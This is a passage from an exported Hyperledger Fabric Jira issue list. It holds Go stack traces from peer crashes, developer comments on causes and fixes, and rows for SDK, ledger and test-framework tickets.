0x16705c0) /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:213 +0x40 github.com/hyperledger/fabric/peer/channel.createCmd.func1(0xc42024f200, 0xc4202d14a0, 0x0, 0x6, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:59 +0x52 github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).execute(0xc42024f200, 0xc4202d11a0, 0x6, 0x6, 0xc42024f200, 0xc4202d11a0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:599 +0x3e8 github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).ExecuteC(0x164d4e0, 0x11, 0xc42025a900, 0x5) /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:689 +0x2fe github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).Execute(0x164d4e0, 0x14, 0xc420014035) /opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:648 +0x2b main.main() /opt/gopath/src/github.com/hyperledger/fabric/peer/main.go:112 +0x5e1 goroutine 24 [syscall]: os/signal.signal_recv(0x0) /opt/go/src/runtime/sigqueue.go:131 +0xa6 os/signal.loop() /opt/go/src/os/signal/signal_unix.go:22 +0x22 created by os/signal.init.0 /opt/go/src/os/signal/signal_unix.go:28 +0x41 goroutine 29 [IO wait]: internal/poll.runtime_pollWait(0x7fcf42a1c060, 0x72, 0x0) /opt/go/src/runtime/netpoll.go:173 +0x57 internal/poll.(*pollDesc).wait(0xc420121e18, 0x72, 0xffffffffffffff00, 0x165d680, 0x1654ba0) /opt/go/src/internal/poll/fd_poll_runtime.go:85 +0xae internal/poll.(*pollDesc).waitRead(0xc420121e18, 0xc4203d2000, 0x8000, 0x8000) /opt/go/src/internal/poll/fd_poll_runtime.go:90 +0x3d internal/poll.(*FD).Read(0xc420121e00, 0xc4203d2000, 0x8000, 0x8000, 0x0, 0x0, 0x0) /opt/go/src/internal/poll/fd_unix.go:126 +0x18a net.(*netFD).Read(0xc420121e00, 0xc4203d2000, 0x8000, 0x8000, 0xc4203ad2a0, 0xc42003bd40, 0xc42003bcb0) /opt/go/src/net/fd_unix.go:202 +0x52 net.(*conn).Read(0xc420078590, 0xc4203d2000, 0x8000, 0x8000, 0x0, 0x0, 0x0) /opt/go/src/net/net.go:176 +0x6d bufio.(*Reader).Read(0xc4203c6300, 0xc4202b08f8, 0x9, 0x9, 0xc42003bd50, 0x8b8806, 0xc4203b8e70) /opt/go/src/bufio/bufio.go:213 +0x30b io.ReadAtLeast(0x1656c00, 0xc4203c6300, 0xc4202b08f8, 0x9, 0x9, 0x9, 0x0, 0x0, 0xc42003be5f) /opt/go/src/io/io.go:309 +0x86 io.ReadFull(0x1656c00, 0xc4203c6300, 0xc4202b08f8, 0x9, 0x9, 0x8739eab01, 0xf600000000000008, 0x8) /opt/go/src/io/io.go:327 +0x58 github.com/hyperledger/fabric/vendor/golang.org/x/net/http2.readFrameHeader(0xc4202b08f8, 0x9, 0x9, 0x1656c00, 0xc4203c6300, 0x0, 0x0, 0xc4203b1058, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/golang.org/x/net/http2/frame.go:237 +0x7b github.com/hyperledger/fabric/vendor/golang.org/x/net/http2.(*Framer).ReadFrame(0xc4202b08c0, 0x165fac0, 0xc4203b8c00, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/golang.org/x/net/http2/frame.go:492 +0xa4 github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*framer).readFrame(0xc4203b8bd0, 0xc4203b8c00, 0xc4203b8c00, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http_util.go:592 +0x2f github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).reader(0xc4203e2000) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1154 +0xc0 created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:260 +0xbf8 goroutine 30 [runnable]: github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).controller(0xc4203e2000) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1227 +0x148 created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:290 +0xd2e goroutine 31 [select]: github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).keepalive(0xc4203e2000) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1276 +0x13c created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:292 +0xdd2 goroutine 32 [select]: github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*addrConn).transportMonitor(0xc4201f8540) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:995 +0x1de created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).resetAddrConn /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:716 +0x67a goroutine 34 [select]: github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newClientStream.func3(0x166c200, 0xc4203e2000, 0xc4201f8380, 0xc4203ae6e0, 0xc42006d500) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:255 +0x1cd created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newClientStream /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:254 +0xe23 goroutine 43 [select]: github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newClientStream.func3(0x166c200, 0xc4203e21a0, 0xc4201f8700, 0xc4203aeb00, 0xc42006d800) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:255 +0x1cd created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newClientStream /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:254 +0xe23 goroutine 39 [IO wait]: internal/poll.runtime_pollWait(0x7fcf42a1bfa0, 0x72, 0x0) /opt/go/src/runtime/netpoll.go:173 +0x57 internal/poll.(*pollDesc).wait(0xc4203fcf98, 0x72, 0xffffffffffffff00, 0x165d680, 0x1654ba0) /opt/go/src/internal/poll/fd_poll_runtime.go:85 +0xae internal/poll.(*pollDesc).waitRead(0xc4203fcf98, 0xc420414000, 0x8000, 0x8000) /opt/go/src/internal/poll/fd_poll_runtime.go:90 +0x3d internal/poll.(*FD).Read(0xc4203fcf80, 0xc420414000, 0x8000, 0x8000, 0x0, 0x0, 0x0) /opt/go/src/internal/poll/fd_unix.go:126 +0x18a net.(*netFD).Read(0xc4203fcf80, 0xc420414000, 0x8000, 0x8000, 0xc42040cae0, 0xc4203f4d40, 0xc4203f4cb0) /opt/go/src/net/fd_unix.go:202 +0x52 net.(*conn).Read(0xc4200785c0, 0xc420414000, 0x8000, 0x8000, 0x0, 0x0, 0x0) /opt/go/src/net/net.go:176 +0x6d bufio.(*Reader).Read(0xc420407260, 0xc4202b0ab8, 0x9, 0x9, 0xc4203f4d50, 0x8b8806, 0xc4203b9e60) /opt/go/src/bufio/bufio.go:213 +0x30b io.ReadAtLeast(0x1656c00, 0xc420407260, 0xc4202b0ab8, 0x9, 0x9, 0x9, 0x0, 0x0, 0xc4203f4e5f) /opt/go/src/io/io.go:309 +0x86 io.ReadFull(0x1656c00, 0xc420407260, 0xc4202b0ab8, 0x9, 0x9, 0x8739eab01, 0xf600000000000008, 0x8) /opt/go/src/io/io.go:327 +0x58 github.com/hyperledger/fabric/vendor/golang.org/x/net/http2.readFrameHeader(0xc4202b0ab8, 0x9, 0x9, 0x1656c00, 0xc420407260, 0x0, 0x0, 0xc4200169d0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/golang.org/x/net/http2/frame.go:237 +0x7b github.com/hyperledger/fabric/vendor/golang.org/x/net/http2.(*Framer).ReadFrame(0xc4202b0a80, 0x165fac0, 0xc4203b9c20, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/golang.org/x/net/http2/frame.go:492 +0xa4 github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*framer).readFrame(0xc4203b9bf0, 0xc4203b9c20, 0xc4203b9c20, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http_util.go:592 +0x2f github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).reader(0xc4203e21a0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1154 +0xc0 created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:260 +0xbf8 goroutine 40 [select]: github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).controller(0xc4203e21a0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1227 +0x148 created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:290 +0xd2e goroutine 41 [select]: github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.(*http2Client).keepalive(0xc4203e21a0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:1276 +0x13c created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:292 +0xdd2 goroutine 42 [select]: github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*addrConn).transportMonitor(0xc4201f88c0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:995 +0x1de created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).resetAddrConn /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:716 +0x67a goroutine 44 [select]: net.(*Resolver).LookupIPAddr(0x169d370, 0x1667b40, 0xc420450060, 0x7ffed2e5ee02, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0) /opt/go/src/net/lookup.go:196 +0x52b net.(*Resolver).internetAddrList(0x169d370, 0x1667b40, 0xc420450060, 0xee7636, 0x3, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0x0, ...) /opt/go/src/net/ipsock.go:293 +0x644 net.(*Resolver).resolveAddrList(0x169d370, 0x1667b40, 0xc420450060, 0xee7b40, 0x4, 0xee7636, 0x3, 0x7ffed2e5ee02, 0xc, 0x0, ...) /opt/go/src/net/dial.go:193 +0x594 net.(*Dialer).DialContext(0xc420049458, 0x1667b40, 0xc420450060, 0xee7636, 0x3, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0x0, ...) /opt/go/src/net/dial.go:375 +0x248 github.com/hyperledger/fabric/vendor/google.golang.org/grpc.dialContext(0x1667b40, 0xc420450060, 0xee7636, 0x3, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0xc42006da00, 0xc4203fd480) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/go17.go:38 +0xb3 github.com/hyperledger/fabric/vendor/google.golang.org/grpc.DialContext.func1(0x7fcf42a24a38, 0xc420450060, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0x16571c0, 0xc42006b930) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:329 +0x86 github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newProxyDialer.func1(0x7fcf42a24a38, 0xc420450060, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/proxy.go:121 +0x137 github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.dial(0x7fcf42a24a38, 0xc420450060, 0xc42040d970, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:119 +0x5a github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client(0x7fcf42a24a38, 0xc420450060, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0xeef4b1, 0xd, 0x0, 0x0, ...) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:157 +0xa7 github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.NewClientTransport(0x7fcf42a24a38, 0xc420450060, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0xeef4b1, 0xd, 0x0, 0x0, ...) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/transport.go:505 +0xae github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*addrConn).resetTransport(0xc4201f8c40, 0xc42044a200, 0xc4201f8c60, 0xc4203aeec8) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:929 +0x4b4 github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).resetAddrConn(0xc4201f8a80, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:702 +0x340 github.com/hyperledger/fabric/vendor/google.golang.org/grpc.DialContext.func3(0xc420450000, 0xc4201f8a80, 0x0, 0x0, 0x7ffed2e5ee02, 0xc) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:417 +0x223 created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.DialContext /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:386 +0x441 goroutine 45 [select]: net.cgoLookupIP(0x1667b40, 0xc420450060, 0x7ffed2e5ee02, 0x7, 0xc4203c8580, 0x5c008c, 0xc420076080, 0x0, 0xc4203ed5e0, 0xc4203ed600) /opt/go/src/net/cgo_unix.go:214 +0x1b0 net.(*Resolver).lookupIP(0x169d370, 0x1667b40, 0xc420450060, 0x7ffed2e5ee02, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0) /opt/go/src/net/lookup_unix.go:95 +0x12d net.(*Resolver).(net.lookupIP)-fm(0x1667b40, 0xc420450060, 0x7ffed2e5ee02, 0x7, 0x3, 0xc420065e00, 0xc420058040, 0xc4203ed79a, 0xc42001f300) /opt/go/src/net/lookup.go:187 +0x56 net.glob..func10(0x1667b40, 0xc420450060, 0xc42040d9c0, 0x7ffed2e5ee02, 0x7, 0x42ad09, 0xc400000008, 0xc420058040, 0x0, 0x8db329) /opt/go/src/net/hook.go:19 +0x52 net.(*Resolver).LookupIPAddr.func1(0xc, 0x0, 0x0, 0x1) /opt/go/src/net/lookup.go:193 +0x5c internal/singleflight.(*Group).doCall(0x169d360, 0xc4203bcf00, 0x7ffed2e5ee02, 0x7, 0xc42044a300) /opt/go/src/internal/singleflight/singleflight.go:93 +0x2e created by internal/singleflight.(*Group).DoChan /opt/go/src/internal/singleflight/singleflight.go:86 +0x31f root@etcd-2c-2:~/fabric-samples#

 ;;;","10/May/18 5:47 PM;yoheiueda;I encountered the similar segv error before.

In my case, the symptom disappeared after I removed  the following line from /etc/resolv.conf.
{quote}options single-request-reopen
{quote}
 ;;;","08/Jan/19 3:04 AM;denyeart;Problem continues to be seen, see FAB-13419 and https://www.codementor.io/alibabacloud/hyperledger-fabric-deployment-on-alibaba-cloud-environment-sigsegv-problem-analysis-and-solutions-naxdqprd6;;;","17/Jan/19 12:12 AM;sykesm;The data associated with this issue is woefully out of date. Given the reference to FAB-13419 (and its attached documentation), I'm closing this in favor of that.;;;",,,,,,,,,,,,,,,,,,,,,,,,
RSCC should not use ledger hook for config updates,FAB-5824,20253,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,18/Aug/17 1:41 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,25/Jan/18 2:07 AM,,,,,,fabric-peer,,,,,,0,,,,,,,RSCC should use the existing ledger hook only for join time setup. It should ignore later updates.,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydj3:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jan/18 2:07 AM;muralisr;This was committed a while back. Closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support SDK API to request attributes in ECert,FAB-5825,20254,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,smithbk,smithbk,smithbk,18/Aug/17 3:20 AM,23/Jan/20 7:01 AM,28/Oct/23 3:00 AM,23/Jan/20 7:01 AM,,,,Future,,fabric-ca,,,,,,0,sdk,stale-item,,,,,"This requires the following change ...

For both the enroll and reenroll request, allow the user optionally request that attributes be inserted into the ECert.
See the attr_reqs field in https://gerrit.hyperledger.org/r/#/c/12519/2/swagger/swagger-fabric-ca.json.
For each attribute requested, the ""name"" is required and ""require"" is optional.
",,rickr,smithbk,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABC-539,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzx02n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,rickr,smithbk,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Aug/17 11:35 PM;rickr;For  SDK clients the work to do is provide a mean for these new attributes to be specified on enroll reenroll request.  Anything more ?;;;","23/Jan/20 7:01 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support SDK API to request attributes in ECert and handle secret material appropriately,FAB-5826,20255,20254,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,harrisob@us.ibm.com,smithbk,smithbk,18/Aug/17 3:23 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,03/Oct/17 6:06 AM,,,,v1.1.0,,fabric-sdk-node,,,,,,0,,,,,,,See https://jira.hyperledger.org/browse/FAB-5825,,denyeart,harrisob@us.ibm.com,smithbk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydjb:",,,,,,,,,,,,,,,,,,,,,,,denyeart,harrisob@us.ibm.com,smithbk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/Sep/17 8:15 PM;harrisob@us.ibm.com;https://gerrit.hyperledger.org/r/#/c/13371/;;;","26/Sep/17 10:46 PM;Clayton Sims;marking done CR merged;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support SDK API to request attributes in ECert and handle secret material appropriately,FAB-5827,20256,20254,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rickr,smithbk,smithbk,18/Aug/17 3:25 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,05/Sep/17 10:26 PM,,,,v1.1.0,,fabric-sdk-java,,,,,,0,,,,,,,"See https://jira.hyperledger.org/browse/FAB-5825

 

https://gerrit.hyperledger.org/r/#/c/12999/",,smithbk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydjj:",,,,,,,,,,,,,,,,,,,,,,,smithbk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support python SDK API to request attributes in ECert and handle secret material appropriately,FAB-5828,20257,20254,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,smithbk,smithbk,18/Aug/17 3:26 AM,23/Jan/20 7:02 AM,28/Oct/23 3:00 AM,23/Jan/20 7:02 AM,,,,Future,,fabric-sdk-py,,,,,,0,Release-planning-1.2,stale-item,,,,,See https://jira.hyperledger.org/browse/FAB-5825,,smithbk,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydjr:",,,,,,,,,,,,,,,,,,,,,,,smithbk,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 7:02 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support go SDK API to request attributes in ECert and handle secret material appropriately,FAB-5829,20258,20254,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,smithbk,smithbk,18/Aug/17 3:27 AM,23/Jan/20 7:02 AM,28/Oct/23 3:00 AM,23/Jan/20 7:02 AM,,,,Future,,fabric-sdk-go,,,,,,0,Release-planning-1.2,stale-item,,,,,See https://jira.hyperledger.org/browse/FAB-5825,,smithbk,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydjz:",,,,,,,,,,,,,,,,,,,,,,,smithbk,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jan/20 7:02 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peer crashes on getState,FAB-5830,20259,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,palani.kodeswaran,palani.kodeswaran,18/Aug/17 4:06 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Oct/17 10:22 PM,,,,,,fabric-ledger,,,,,,0,Ledger,,,,,,"We are running a four peer alpha2-network, and 2/4 of the peers crash with the following message on getState()




[36m2017-08-15 19:03:58.432 UTC [chaincode] func1 -> DEBU 124e[0m [e0e01909] getting state for chaincode wfmgr, key 11ffc294a8a744edad6c224061fa7dc0, channel beta
panic: This instance should not be used after calling Done()
 panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x30 pc=0x67f194]

goroutine 3373340 [running]:
panic(0xc73460, 0xc420016040)
 /opt/go/src/runtime/panic.go:500 +0x1a1
github.com/hyperledger/fabric/core/chaincode.(*Handler).handleGetState.func1.1(0xc4213d6ab0, 0xc421a6c1e0, 0xc422561e68)
 /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/handler.go:621 +0x74
panic(0xc25580, 0xc422430980)
 /opt/go/src/runtime/panic.go:458 +0x243
github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr.(*queryHelper).checkDone(0xc420176500)
 /opt/gopath/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/helper.go:119 +0x84
github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr.(*queryHelper).getState(0xc420176500, 0xc421cf2563, 0x5, 0xc4223a1c00, 0x20, 0xc4224308d0, 0xc422b99180, 0x4, 0x4, 0xc4224308d0)
 /opt/gopath/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/helper.go:38 +0x2f
github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr.(*lockBasedTxSimulator).GetState(0xc42266b940, 0xc421cf2563, 0x5, 0xc4223a1c00, 0x20, 0x4, 0x2, 0x2, 0xc422b4e050, 0x0)
 /opt/gopath/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/lockbased_tx_simulator.go:42 +0x5d
github.com/hyperledger/fabric/core/chaincode.(*Handler).handleGetState.func1(0xc4213d6ab0, 0xc421a6c1e0)
 /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/handler.go:639 +0x502
created by github.com/hyperledger/fabric/core/chaincode.(*Handler).handleGetState
 /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/handler.go:660 +0x49

 ",,alacambra-db,denyeart,manish-sethi,palani.kodeswaran,praveen.j,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydk7:",,,,,,,,,,,,,,,,,,,,,,,alacambra-db,denyeart,manish-sethi,palani.kodeswaran,praveen.j,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Aug/17 10:53 PM;denyeart;[~manish-sethi] This bug was opened against alpha2.  Do you think this problem could occur in 1.0.0 code?;;;","25/Aug/17 12:04 AM;manish-sethi;Yes this could still happen in 1.0.0. I'll replace this panic by error.

In addition I'll open a separate JIRA for fixing the chaincode framework that causes this situation. However, chaincode framework fix will not be as critical.;;;","26/Aug/17 2:22 AM;praveen.j;Thanks [~manish-sethi] for looking into this. Can you briefly explain why you think this is happening? Do you have an outlook for when it will be fixed?;;;","26/Aug/17 2:52 AM;manish-sethi;Hi [~praveen.j] - I'll submit a CR for this by Monday. In brief, this happens because of a race condition in the chaincode framework. If a call is made after the chaincode times out, it results into this error.;;;","29/Aug/17 12:05 AM;manish-sethi;Submitted the CR (https://gerrit.hyperledger.org/r/#/c/12851/) for replacing this panic by an error return.

Also, opened an additional JIRA FAB-5939.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Fabric-test: In behave framework, Introduce capability for random keys (in addition to existing random values/payloads)",FAB-5831,20260,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,AdnanChoudhury,AdnanChoudhury,AdnanChoudhury,18/Aug/17 5:16 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,06/Sep/17 12:54 AM,,,,,,fabric-quality,,,,,,0,behave,quality,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydkf:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/